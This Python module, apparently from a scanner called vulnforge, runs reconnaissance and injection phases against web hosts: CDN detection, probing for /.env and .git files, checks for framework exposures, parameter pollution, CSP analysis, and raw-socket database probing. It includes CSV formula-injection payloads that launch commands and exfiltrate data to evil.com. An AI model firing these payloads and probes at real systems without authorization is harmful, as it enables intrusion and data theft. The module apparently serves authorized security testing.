"""Web infrastructure, CDN, CSP, file upload, and host injection phases."""

import asyncio
import base64
import socket
import struct
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any, Dict, List, Set

from vulnforge.phases.client_side import _CSP_BYPASS_CDNS
from vulnforge.phases.helpers import (
    _SKIP_PARAMS,
    PhaseSet,
    _is_static_url,
)
from vulnforge.process import _PIPELINE_CFG
from vulnforge.tools import Tools
from vulnforge.utils import (
    _async_urlopen,
    _async_urlopen_no_redirect,
    _extra_headers_dict,
    _extract_host,
    _get_urlopener,
    _is_valid_hostname,
    _load_live_hosts,
    _throttle_rate,
    count_nonblank,
    ensure,
    log,
    read_lines,
)


async def phase_47_CDN(
    domain: str,
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"47-CDN"}:
        return {}
    _out = outdir / "cdn_detection.txt"
    if _out.exists() and not force:
        return {"47-CDN": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 47-CDN: CDN detection and origin IP discovery")
    hosts = set()
    for key in ("02-RESOLVE", "04-SCAN"):
        p = prev.get(key)
        if p and isinstance(p, str) and Path(p).exists():
            for ln in read_lines(Path(p)):
                ln = ln.strip().lower()
                if ln and _is_valid_hostname(ln):
                    hosts.add(ln)
    resolved = outdir / "resolved.txt"
    if resolved.exists():
        for ln in read_lines(resolved):
            ln = ln.strip().lower()
            if ln and _is_valid_hostname(ln):
                hosts.add(ln)
    findings: List[str] = []
    cdn_signatures = {
        "cloudflare": ["cloudflare", "__cfduid", "cf-ray"],
        "cloudfront": ["cloudfront.net", "x-amz-cf-id"],
        "akamai": ["akamai", "akamaized"],
        "fastly": ["fastly", "x-fastly-request"],
        "incapsula": ["incapsula", "X-Iinfo"],
        "sucuri": ["sucuri", "x-sucuri-id"],
        "stackpath": ["stackpath", "stackpath-cdn"],
        "keycdn": ["keycdn"],
        "cdn77": ["cdn77"],
    }
    for h in sorted(hosts)[: _PIPELINE_CFG.sample_hosts_origin]:
        try:
            await _throttle_rate()
            req = urllib.request.Request(f"https://{h}", method="HEAD")
            code, headers, _ = await _async_urlopen_no_redirect(req, timeout=10)
            hdr_str = str(dict(headers)).lower()
            detected = [
                name for name, sigs in cdn_signatures.items() if any(s in hdr_str for s in sigs)
            ]
            if detected:
                findings.append(f"[CDN] {h}: {', '.join(detected)}")
        except asyncio.CancelledError:
            raise
        except Exception:
            pass
    ensure(_out).write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"47-CDN: {len(findings)} CDN(s) detected")
    return {"47-CDN": str(_out), "count": len(findings)}


async def phase_48_CONTENT(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"48-CONTENT"}:
        return {}
    _out = outdir / "content_discovery.txt"
    if _out.exists() and not force:
        return {"48-CONTENT": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 48-CONTENT: content discovery via common paths")
    hosts = set()
    for key in ("02-RESOLVE", "04-SCAN"):
        p = prev.get(key)
        if p and isinstance(p, str) and Path(p).exists():
            for ln in read_lines(Path(p)):
                ln = ln.strip().lower()
                if ln and _is_valid_hostname(ln):
                    hosts.add(ln)
    targets = outdir / "host_targets.txt"
    if targets.exists():
        for ln in read_lines(targets):
            ln = ln.strip().lower()
            if ln and _is_valid_hostname(ln):
                hosts.add(ln)
    common_paths = [
        "/.env",
        "/.git/config",
        "/.git/HEAD",
        "/admin",
        "/api",
        "/backup",
        "/config",
        "/config.php",
        "/credentials",
        "/db",
        "/debug",
        "/docker-compose.yml",
        "/dump",
        "/index.php",
        "/info.php",
        "/jenkins",
        "/logs",
        "/node_modules",
        "/phpinfo.php",
        "/private",
        "/robots.txt",
        "/sitemap.xml",
        "/sql",
        "/ssh",
        "/swagger.json",
        "/swagger-ui.html",
        "/test",
        "/uploads",
        "/wp-admin",
        "/wp-content",
        "/wp-json",
        "/wsdl",
    ]
    findings: List[str] = []
    seen_urls: Set[str] = set()
    for h in sorted(hosts)[: _PIPELINE_CFG.sample_hosts_git]:
        for path in common_paths:
            url = f"https://{h}{path}"
            if url in seen_urls:
                continue
            seen_urls.add(url)
            if len(findings) >= _PIPELINE_CFG.sample_urls_fuzz:
                break
            try:
                await _throttle_rate()
                urlopen = _get_urlopener()
                req = urllib.request.Request(url, method="GET")
                code, _, body = await _async_urlopen(urlopen, req, timeout=10)
                if code < 400:
                    size = len(body)
                    findings.append(f"[found] {url} (HTTP {code}, {size}b)")
            except asyncio.CancelledError:
                raise
            except Exception:
                continue
    ensure(_out).write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"48-CONTENT: {len(findings)} path(s) discovered")
    return {"48-CONTENT": str(_out), "count": len(findings)}


async def phase_49_FRAMEWORKS(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"49-FRAMEWORKS"}:
        return {}
    _out = outdir / "framework_vulns.txt"
    if _out.exists() and not force:
        return {"49-FRAMEWORKS": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 49-FRAMEWORKS: web framework detection and vulnerability checks")
    findings: List[str] = []
    _fw_urlopen = _get_urlopener()
    _fw_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists() or not read_lines(hosts_file):
        log("WARNING", "49-FRAMEWORKS: no host targets; skipping")
        return {"49-FRAMEWORKS": str(_out), "count": 0}
    hosts = read_lines(hosts_file)[: _PIPELINE_CFG.sample_hosts_frameworks]
    FRAMEWORK_SIGS: Dict[str, List[Dict[str, str]]] = {
        "Next.js": [
            {"type": "html", "marker": "__NEXT_DATA__"},
            {"type": "header", "name": "x-powered-by", "value": "next"},
        ],
        "React": [
            {"type": "html", "marker": "data-reactroot"},
            {"type": "html", "marker": "data-reactid"},
        ],
        "Vue": [{"type": "html", "marker": "data-v-"}, {"type": "html", "marker": "__vue__"}],
        "Angular": [{"type": "html", "marker": "ng-version"}, {"type": "html", "marker": "ng-app"}],
        "Svelte": [{"type": "html", "marker": "__svelte__"}, {"type": "html", "marker": "svelte-"}],
        "Astro": [
            {"type": "html", "marker": "astro-"},
            {"type": "header", "name": "x-astro", "value": ""},
        ],
        "Nuxt": [{"type": "html", "marker": "__NUXT__"}],
        "Vite": [{"type": "header", "name": "server", "value": "vite"}],
    }
    detected: Dict[str, Set[str]] = {}
    for host in hosts:
        await _throttle_rate()
        base = host if host.startswith("http") else f"https://{host}"
        base = base.rstrip("/")
        try:
            req = urllib.request.Request(
                base, headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers}
            )
            _, resp_h, body_bytes = await _async_urlopen(_fw_urlopen, req, timeout=15)
            body = body_bytes.decode("utf-8", errors="ignore")
            for fw_name, sigs in FRAMEWORK_SIGS.items():
                for sig in sigs:
                    if sig["type"] == "html" and sig["marker"] in body:
                        detected.setdefault(host, set()).add(fw_name)
                        break
                    elif sig["type"] == "header":
                        hdr_val = resp_h.get(sig["name"], "").lower()
                        if (sig["value"] and sig["value"] in hdr_val) or (
                            not sig["value"] and hdr_val
                        ):
                            detected.setdefault(host, set()).add(fw_name)
                            break
        except asyncio.CancelledError:
            raise
        except Exception:
            continue
    if not detected:
        findings.append("[frameworks] No web frameworks detected")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        log("OK", f"49-FRAMEWORKS: {len(findings)} findings → {out}")
        return {"49-FRAMEWORKS": str(_out), "count": len(findings)}
    for host, frameworks in detected.items():
        base = host if host.startswith("http") else f"https://{host}"
        base = base.rstrip("/")
        for fw in sorted(frameworks):
            findings.append(f"[framework-detected] {host} — {fw}")
            if fw == "Next.js":
                for path in ["/_next/data/", "/_next/static/"]:
                    try:
                        req = urllib.request.Request(
                            base + path,
                            method="HEAD",
                            headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers},
                        )
                        s, _, _ = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200:
                            findings.append(f"[nextjs-exposed] {base}{path} — HTTP {s}")
                    except asyncio.CancelledError:
                        raise
                    except Exception:
                        continue
                try:
                    req = urllib.request.Request(
                        base + "/",
                        method="GET",
                        headers={
                            "User-Agent": "Mozilla/5.0",
                            "x-middleware-subrequest": "true",
                            **_fw_extra_headers,
                        },
                    )
                    s, rh, _ = await _async_urlopen(_fw_urlopen, req, timeout=10)
                    if "x-middleware-rewrite" in str(rh).lower():
                        findings.append(
                            f"[nextjs-middleware] {base} — x-middleware-subrequest bypass possible"
                        )
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
                for route in ["/_next/data/develop.json", "/_next/data/production.json"]:
                    try:
                        req = urllib.request.Request(
                            base + route,
                            method="GET",
                            headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers},
                        )
                        s, _, b = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200 and len(b) > 50:
                            findings.append(f"[nextjs-data-exposure] {base}{route} — HTTP {s}")
                    except asyncio.CancelledError:
                        raise
                    except Exception:
                        continue
            elif fw == "React":
                for path in ["/static/js/bundle.js.map", "/static/js/main.js.map"]:
                    try:
                        req = urllib.request.Request(
                            base + path,
                            method="HEAD",
                            headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers},
                        )
                        s, _, _ = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200:
                            findings.append(f"[react-sourcemap] {base}{path} — sourcemap exposed")
                    except asyncio.CancelledError:
                        raise
                    except Exception:
                        continue
                try:
                    req = urllib.request.Request(
                        base + "/sockjs-node/",
                        method="HEAD",
                        headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers},
                    )
                    s, _, _ = await _async_urlopen(_fw_urlopen, req, timeout=10)
                    if s < 400:
                        findings.append(
                            f"[react-sockjs] {base}/sockjs-node/ — dev server exposed in prod"
                        )
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
            elif fw == "Vue":
                for path in ["/vue-multiselect/", "/vue-router/"]:
                    try:
                        req = urllib.request.Request(
                            base + path,
                            method="HEAD",
                            headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers},
                        )
                        s, _, _ = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200:
                            findings.append(f"[vue-exposed] {base}{path} — HTTP {s}")
                    except asyncio.CancelledError:
                        raise
                    except Exception:
                        continue
            elif fw == "Angular":
                for path in [
                    "/runtime.js",
                    "/polyfills.js",
                    "/runtime-es2015.js",
                    "/polyfills-es2015.js",
                ]:
                    try:
                        req = urllib.request.Request(
                            base + path,
                            method="HEAD",
                            headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers},
                        )
                        s, _, _ = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200:
                            findings.append(f"[angular-exposed] {base}{path} — HTTP {s}")
                    except asyncio.CancelledError:
                        raise
                    except Exception:
                        continue
                for path in ["/runtime.js.map", "/polyfills.js.map"]:
                    try:
                        req = urllib.request.Request(
                            base + path,
                            method="HEAD",
                            headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers},
                        )
                        s, _, _ = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200:
                            findings.append(f"[angular-sourcemap] {base}{path} — sourcemap exposed")
                    except asyncio.CancelledError:
                        raise
                    except Exception:
                        continue
            elif fw == "Svelte":
                for path in ["/__action/", "/__action/__form/"]:
                    try:
                        req = urllib.request.Request(
                            base + path,
                            data=b"",
                            method="POST",
                            headers={
                                "Content-Type": "application/x-www-form-urlencoded",
                                "User-Agent": "Mozilla/5.0",
                                **_fw_extra_headers,
                            },
                        )
                        s, _, _ = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s in (200, 302, 405):
                            findings.append(f"[sveltekit-action] {base}{path} — HTTP {s}")
                    except asyncio.CancelledError:
                        raise
                    except Exception:
                        continue
            elif fw == "Astro":
                for path in ["/_astro/", "/astro.env"]:
                    try:
                        req = urllib.request.Request(
                            base + path,
                            method="GET",
                            headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers},
                        )
                        s, _, b = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200 and len(b) > 20:
                            findings.append(f"[astro-exposed] {base}{path} — HTTP {s}")
                    except asyncio.CancelledError:
                        raise
                    except Exception:
                        continue
            elif fw == "Nuxt":
                for path in ["/_nuxt/", "/_nuxt/builds/meta/dev.json"]:
                    try:
                        req = urllib.request.Request(
                            base + path,
                            method="GET",
                            headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers},
                        )
                        s, _, b = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200:
                            findings.append(f"[nuxt-exposed] {base}{path} — HTTP {s}")
                    except asyncio.CancelledError:
                        raise
                    except Exception:
                        continue
            elif fw == "Vite":
                for path in ["/@vite/client", "/__vite_ping"]:
                    try:
                        req = urllib.request.Request(
                            base + path,
                            method="GET",
                            headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers},
                        )
                        s, _, b = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200:
                            findings.append(f"[vite-dev-server] {base}{path} — HTTP {s}")
                    except asyncio.CancelledError:
                        raise
                    except Exception:
                        continue
    if not findings:
        findings.append("[frameworks] No framework-specific vulnerabilities detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"49-FRAMEWORKS: {len(findings)} framework findings → {out}")
    return {"49-FRAMEWORKS": str(_out), "count": len(findings)}


def _hpp_test_qs(
    qs: Dict[str, List[str]], param_name: str, orig_val: str, strategy: str
) -> Dict[str, List[str]]:
    test_qs = dict(qs)
    if strategy == "first":
        test_qs[param_name] = [orig_val, "hpp_test_first"]
    elif strategy == "last":
        test_qs[param_name] = ["hpp_test_last", orig_val]
    elif strategy == "any":
        test_qs[param_name] = [orig_val, "hpp_test_any"]
    else:
        test_qs[param_name] = [orig_val]
        test_qs[f"{param_name}[]"] = ["hpp_test_concat"]
    return test_qs


async def phase_51_HPP(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"51-HPP"}:
        return {}
    _out = outdir / "hpp.txt"
    if _out.exists() and not force:
        return {"51-HPP": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 51-HPP: HTTP parameter pollution detection")
    findings: List[str] = []
    _h_urlopen = _get_urlopener()
    _h_extra_headers = _extra_headers_dict()
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("WARNING", "51-HPP: no URLs; skipping")
        return {"51-HPP": str(_out), "count": 0}
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][:50]
    hpp_pollutions = ["first", "last", "any", "concat"]
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in list(qs.keys())[:3]:
            orig_val = qs[param_name][0]
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for strategy in hpp_pollutions:
                try:
                    test_qs = _hpp_test_qs(qs, param_name, orig_val, strategy)
                    test_qs_enc = urllib.parse.urlencode(test_qs, doseq=True)
                    ref_qs = urllib.parse.urlencode(qs, doseq=True)
                    ref_url = urllib.parse.urlunparse(parsed._replace(query=ref_qs))
                    test_url = urllib.parse.urlunparse(parsed._replace(query=test_qs_enc))
                    await _throttle_rate()
                    req = urllib.request.Request(
                        ref_url, headers={"User-Agent": "Mozilla/5.0", **_h_extra_headers}
                    )
                    _, _, ref_body_bytes = await _async_urlopen(_h_urlopen, req, timeout=10)
                    treq = urllib.request.Request(
                        test_url, headers={"User-Agent": "Mozilla/5.0", **_h_extra_headers}
                    )
                    _, _, test_body_bytes = await _async_urlopen(_h_urlopen, treq, timeout=10)
                    ref_body = ref_body_bytes.decode("utf-8", errors="ignore")
                    test_body = test_body_bytes.decode("utf-8", errors="ignore")
                    if len(test_body) != len(ref_body) or "hpp_test" in test_body:
                        findings.append(
                            f"[hpp-reflected] {test_url} param={param_name} strategy={strategy} "
                            f"(response differs from baseline)"
                        )
                        break
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
    if not findings:
        findings.append("[hpp] No HTTP parameter pollution candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"51-HPP: {len(findings)} HPP findings → {out}")
    return {"51-HPP": str(out), "count": len(findings)}


_SERVERLESS_PATHS = [
    "/api",
    "/api/",
    "/api/v1",
    "/api/v2",
    "/api/v3",
    "/prod",
    "/dev",
    "/staging",
    "/lambda",
    "/functions",
    "/function",
    "/.netlify/functions",
    "/.netlify/",
    "/_ah/api",  # GAE
    "/api/users",
    "/api/health",
    "/api/status",
    "/api/config",
    "/api/swagger.json",
    "/api/openapi.json",
    "/api/graphql",
    "/graphql",
    "/admin/api",
    "/admin",
    "/.env",
    "/.env.local",
]


async def phase_52_SERVERLESS(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"52-SERVERLESS"}:
        return {}
    _out = outdir / "serverless_endpoints.txt"
    if _out.exists() and not force:
        return {"52-SERVERLESS": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 52-SERVERLESS: serverless / cloud function endpoint discovery")
    findings: List[str] = []
    _s_urlopen = _get_urlopener()
    _s_extra_headers = _extra_headers_dict()
    hosts = _load_live_hosts(outdir)
    if not hosts:
        log("WARNING", "52-SERVERLESS: no hosts; skipping")
        return {"52-SERVERLESS": str(_out), "count": 0}
    for host in hosts[:20]:
        host_clean = _extract_host(host)
        if not host_clean:
            continue
        for scheme in ("https://", "http://"):
            for path in _SERVERLESS_PATHS:
                url = f"{scheme}{host_clean}{path}"
                try:
                    req = urllib.request.Request(
                        url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_s_extra_headers}
                    )
                    s, _, b = await _async_urlopen(_s_urlopen, req, timeout=8)
                    if s in (200, 201, 202, 204, 401, 403):
                        body_sample = b.decode("utf-8", errors="ignore")[:200]
                        kw_found = [
                            kw
                            for kw in [
                                "api",
                                "user",
                                "admin",
                                "graphql",
                                "swagger",
                                "lambda",
                                "function",
                                "cloud",
                                "runtime",
                                "serverless",
                            ]
                            if kw in body_sample.lower()
                        ]
                        extra = f" keywords={kw_found}" if kw_found else ""
                        findings.append(f"[serverless-endpoint] {url} — HTTP {s}{extra}")
                except (urllib.error.HTTPError, urllib.error.URLError, OSError):
                    pass
                except asyncio.CancelledError:
                    raise
                except Exception:
                    pass
    if not findings:
        findings.append("[serverless] No serverless endpoints discovered")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"52-SERVERLESS: {len(findings)} serverless endpoints → {out}")
    return {"52-SERVERLESS": str(out), "count": len(findings)}


async def phase_53_CSP(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"53-CSP"}:
        return {}
    _out = outdir / "csp_analysis.txt"
    if _out.exists() and not force:
        return {"53-CSP": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 53-CSP: Content-Security-Policy analysis")
    findings: List[str] = []
    _c_urlopen = _get_urlopener()
    _c_extra_headers = _extra_headers_dict()
    hosts = _load_live_hosts(outdir)
    if not hosts:
        log("WARNING", "53-CSP: no hosts; skipping")
        return {"53-CSP": str(_out), "count": 0}
    for host in hosts[:20]:
        host_clean = _extract_host(host)
        if not host_clean:
            continue
        for scheme in ("https://", "http://"):
            url = f"{scheme}{host_clean}/"
            try:
                req = urllib.request.Request(
                    url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_c_extra_headers}
                )
                s, headers, body_bytes = await _async_urlopen(_c_urlopen, req, timeout=10)
                csp = (
                    headers.get("Content-Security-Policy")
                    or headers.get("Content-Security-Policy-Report-Only")
                    or ""
                )
                if csp:
                    csp_lower = csp.lower()
                    issues = []
                    if "'unsafe-inline'" in csp_lower:
                        issues.append("unsafe-inline present")
                    if "'unsafe-eval'" in csp_lower:
                        issues.append("unsafe-eval present")
                    if (
                        "*.google.com" in csp_lower
                        or "*.facebook.com" in csp_lower
                        or "*.cdn" in csp_lower
                    ):
                        issues.append("wildcard in CSP source")
                    for cdn in _CSP_BYPASS_CDNS:
                        if cdn in csp_lower:
                            issues.append(f"script-source allows known-bypass CDN: {cdn}")
                    if "https:" in csp_lower and "http:" not in csp_lower:
                        pass
                    elif "http:" in csp_lower:
                        issues.append("CSP allows http: scheme (MITM risk)")
                    if not csp_lower.startswith("default-src") and "default-src " not in csp_lower:
                        issues.append("no default-src defined (fallback to open)")
                    if issues:
                        findings.append(f"[csp-issues] {url} — {'; '.join(issues)}")
                    findings.append(f"[csp-header] {url} — {csp[:200]}")
                else:
                    findings.append(f"[csp-missing] {url} — no Content-Security-Policy header")
                break
            except (urllib.error.HTTPError, urllib.error.URLError, OSError):
                continue
            except asyncio.CancelledError:
                raise
            except Exception:
                continue
        else:
            continue
    if not findings:
        findings.append("[csp] No CSP issues found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"53-CSP: {len(findings)} CSP findings → {out}")
    return {"53-CSP": str(out), "count": len(findings)}


_CSVI_PAYLOADS = [
    "=CMD|'/C calc'!A0",
    '=HYPERLINK("http://evil.com/exfil?data="&A1,"Click here")',
    '=DDE("cmd";"/c calc";"AAA")',
    "=MSEXCEL|'/C calc'!A0",
    '+DDE("cmd";"/c calc";"AAA")',
    '=IMPORTXML(CONCATENATE("http://evil.com/?d=",MID(A1,1,50)),"//a")',
    '=WEBSERVICE("http://evil.com/"&A1)',
    "@SUM(1+1)*CMD|'/C calc'!A0",
    "=10+20",
    "=1*1",
]


async def phase_55_CSV_INJECT(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"55-CSV-INJECT"}:
        return {}
    _out = outdir / "csv_injection.txt"
    if _out.exists() and not force:
        return {"55-CSV-INJECT": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 55-CSV-INJECT: CSV / Excel formula injection")
    findings: List[str] = []
    _csv_urlopen = _get_urlopener()
    _csv_extra_headers = _extra_headers_dict()
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("WARNING", "55-CSV-INJECT: no URLs; skipping")
        return {"55-CSV-INJECT": str(_out), "count": 0}
    csv_params = {
        "export",
        "download",
        "report",
        "csv",
        "xls",
        "xlsx",
        "spreadsheet",
        "sheet",
        "format",
        "type",
        "file",
        "name",
        "filename",
        "title",
        "output",
    }
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][:30]
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() not in csv_params:
                continue
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for payload in _CSVI_PAYLOADS:
                try:
                    test_qs = qs.copy()
                    test_qs[param_name] = [payload]
                    new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                    await _throttle_rate()
                    req = urllib.request.Request(
                        test_url, headers={"User-Agent": "Mozilla/5.0", **_csv_extra_headers}
                    )
                    _, resp_headers, body_bytes = await _async_urlopen(
                        _csv_urlopen, req, timeout=10
                    )
                    body = body_bytes.decode("utf-8", errors="ignore")
                    ctype = resp_headers.get("Content-Type", "")
                    if (
                        "csv" in ctype.lower()
                        or "spreadsheet" in ctype.lower()
                        or "excel" in ctype.lower()
                    ):
                        if "=" in body[:50] or "+" in body[:50] or "@" in body[:50]:
                            findings.append(
                                f"[csvi-candidate] {test_url} param={param_name} payload={payload[:30]}"
                            )
                            break
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
    if not findings:
        findings.append("[csv-inject] No CSV injection candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"55-CSV-INJECT: {len(findings)} CSV injection findings → {out}")
    return {"55-CSV-INJECT": str(out), "count": len(findings)}


# ────────────────── Phase 56-EXPOSED-DB: Exposed Database / Storage Probing ────
_EXPOSED_DB_PATHS = [
    ("/_search", "Elasticsearch"),
    ("/.kibana", "Kibana"),
    ("/. elasticsearch", "Elasticsearch"),
    ("/sockjs-node/info", "Node.js/SockJS"),
    ("/.env", ".env file"),
    ("/.git/config", "Git config"),
    ("/console", "Cloud console"),
    ("/kibana", "Kibana"),
    ("/api/status", "API status"),
    ("/health", "Health endpoint"),
    ("/swagger-ui.html", "Swagger UI"),
    ("/actuator", "Spring Actuator"),
    ("/actuator/health", "Actuator health"),
    ("/actuator/env", "Actuator env"),
]

_EXPOSED_DB_PORTS = [
    (9200, "Elasticsearch HTTP"),
    (9300, "Elasticsearch transport"),
    (5601, "Kibana"),
    (9090, "Prometheus"),
    (3000, "Grafana/API"),
    (6379, "Redis"),
    (27017, "MongoDB"),
    (5432, "PostgreSQL"),
    (3306, "MySQL"),
    (8081, "CouchDB"),
    (5984, "CouchDB"),
    (9000, "Hadoop/HDFS"),
    (50070, "Hadoop NameNode"),
    (8088, "Hadoop YARN"),
    (2375, "Docker API"),
    (8443, "Kubernetes API"),
    (6443, "Kubernetes API"),
    (10250, "Kubelet API"),
    (10255, "Kubelet API"),
]


_DB_RAW_TCP_PORTS = {6379, 27017, 5432, 3306}
_DB_BANNER_SIGS = {
    6379: (b"+OK", b"-ERR", b"+PONG", b"redis"),
    27017: (b"BsonMessage", b"\x3c\x00\x00\x00"),
    5432: (b"PostgreSQL", b"\x52\x00\x00\x00"),
    3306: (b"\x0a", b"mysql", b"mariadb"),
}
_DB_HTTP_SIGS = {
    9200: ("cluster_name", "tagline"),
    9300: ("cluster_name",),
    5601: ("kbnname", "kbnversion"),
    9090: ("prometheus", "# help", "# type"),
    8081: ("couchdb",),
    5984: ("couchdb",),
    2375: ("apiversion", "gocommit"),
    50070: ("namenode", "hadoop"),
    8088: ("resourcemanager", "hadoop"),
    10250: ("podlist", "kubelet"),
    10255: ("podlist", "kubelet"),
}


def _db_banner_sig(port: int, banner: bytes) -> bool:
    lowered = banner.lower()
    return any(marker.lower() in lowered for marker in _DB_BANNER_SIGS.get(port, ()))


async def phase_56_EXPOSED_DB(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"56-EXPOSED-DB"}:
        return {}
    _out = outdir / "exposed_databases.txt"
    if _out.exists() and not force:
        return {"56-EXPOSED-DB": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 56-EXPOSED-DB: exposed database / storage probing")
    findings: List[str] = []
    _db_urlopen = _get_urlopener()
    _db_extra_headers = _extra_headers_dict()
    hosts = _load_live_hosts(outdir)
    if not hosts:
        hosts = read_lines(outdir / "resolved.txt") if (outdir / "resolved.txt").exists() else []
    if not hosts:
        log("WARNING", "56-EXPOSED-DB: no hosts; skipping")
        return {"56-EXPOSED-DB": str(_out), "count": 0}
    for host in hosts[:20]:
        host_clean = _extract_host(host)
        if not host_clean:
            continue
        for port, label in _EXPOSED_DB_PORTS:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                result = sock.connect_ex((host_clean, port))
                if result != 0:
                    sock.close()
                    continue
                confirmed = False
                if port in _DB_RAW_TCP_PORTS:
                    try:
                        if port == 6379:
                            sock.sendall(b"PING\r\n")
                            resp = sock.recv(256)
                            if b"+PONG" in resp or b"-NOAUTH" in resp or b"-ERR" in resp:
                                confirmed = True
                        elif port == 27017:
                            _bson = (
                                struct.pack("<i", 19)
                                + b"\x10isMaster\x00"
                                + struct.pack("<i", 1)
                                + b"\x00"
                            )
                            _body = (
                                struct.pack("<i", 0)
                                + b"admin.$cmd\x00"
                                + struct.pack("<ii", 0, 1)
                                + _bson
                            )
                            sock.sendall(struct.pack("<iiii", 16 + len(_body), 1, 0, 2004) + _body)
                            resp = sock.recv(256)
                            if (
                                len(resp) >= 16
                                and resp[12:16] == struct.pack("<i", 1)
                                and (b"ismaster" in resp or b"isWritablePrimary" in resp)
                            ):
                                confirmed = True
                        elif port == 5432:
                            _params = b"user\x00postgres\x00database\x00postgres\x00"
                            sock.sendall(
                                struct.pack(">i", 8 + len(_params) + 1)
                                + struct.pack(">i", 196608)
                                + _params
                                + b"\x00"
                            )
                            resp = sock.recv(256)
                            if resp[:1] in (b"R", b"E", b"N", b"S", b"K", b"Z"):
                                confirmed = True
                        elif port == 3306:
                            banner = sock.recv(256)
                            if _db_banner_sig(port, banner):
                                confirmed = True
                    except OSError:
                        pass
                else:
                    for path, plabel in _EXPOSED_DB_PATHS:
                        if port in (9200, 9300) and "elasticsearch" in label.lower():
                            url = f"http://{host_clean}:{port}/"
                        elif port == 5601:
                            url = f"http://{host_clean}:{port}/app/kibana"
                        else:
                            url = f"http://{host_clean}:{port}{path}"
                        try:
                            req = urllib.request.Request(
                                url,
                                method="GET",
                                headers={"User-Agent": "Mozilla/5.0", **_db_extra_headers},
                            )
                            s, _, db_body = await _async_urlopen(_db_urlopen, req, timeout=5)
                            sigs = _DB_HTTP_SIGS.get(port, ())
                            if s == 200 and sigs:
